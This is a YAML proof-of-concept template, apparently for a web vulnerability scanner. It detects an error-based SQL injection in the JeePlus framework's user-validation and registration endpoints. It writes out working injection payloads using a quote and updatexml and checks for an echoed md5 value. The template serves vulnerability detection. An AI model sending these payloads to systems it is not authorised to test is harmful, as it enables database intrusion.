name: yaml-poc-jeeplus-jeeplus-sql_injection-CNVD-2019-47595
binding: 4cf624bd-c752-4bee-9ff6-762b0c9625f2
detail:
    author: haiqing.chen
    links:
        - https://www.freebuf.com/articles/web/220066.html
    vulnerability:
        id: 8b8f8128-023f-480a-a4de-515e0165961a
        level: high
    warning: Harmless
transport: http
set:
    p1: randomInt(13000000000, 13999999999)
    s1: randomInt(100000, 200000)
    roleName: randomLowercase(5)
    randomCode: randomInt(1000, 9999)
    loginName: randomLowercase(5)
    password: randomInt(100000, 200000)
payloads:
    payloads:
        resetPassword:
            action: |
                "resetPassword"
        validateMobileExist:
            action: |
                "validateMobileExist"
        validateMobile:
            action: |
                "validateMobile"
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /a/sys/user/{{action}}?mobile={{p1}}%27
            follow_redirects: false
        expression: response.status == 500 && response.body_string.contains("java.sql.SQLException") && response.body_string.contains("dao.UserDao")
    r1:
        request:
            cache: true
            method: GET
            path: /a/sys/user/{{action}}?mobile={{p1}}%27and%20(updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1))%23
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
    r2:
        request:
            cache: true
            method: POST
            path: /a/sys/register/registerUser
            headers:
                Content-Type: application/x-www-form-urlencoded
                body: roleName={{roleName}}&mobile={{p1}}%27and%20(updatexml(1,concat(0x7e,(select%20md5({{s1}})),0x7e),1))%23&randomCode={{randomCode}}&loginName={{loginName}}&password={{password}}&confirmNewPassword={{password}}&ck1=on
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(s1)), 2, 28)))
expression: r0() || r1() || r2()
